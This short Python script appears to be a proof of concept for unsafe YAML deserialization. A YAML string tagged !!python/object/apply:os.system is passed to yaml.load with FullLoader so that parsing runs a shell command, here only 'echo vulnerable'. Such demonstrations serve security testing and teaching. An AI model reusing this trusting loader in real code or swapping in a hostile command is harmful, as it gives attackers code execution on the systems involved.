import yaml

def collect_yaml(yaml_string):
    return yaml.load(yaml_string, Loader=yaml.FullLoader)

yaml_data = """
key: !!python/object/apply:os.system ['echo vulnerable']
"""
config = collect_yaml(yaml_data)
print(config)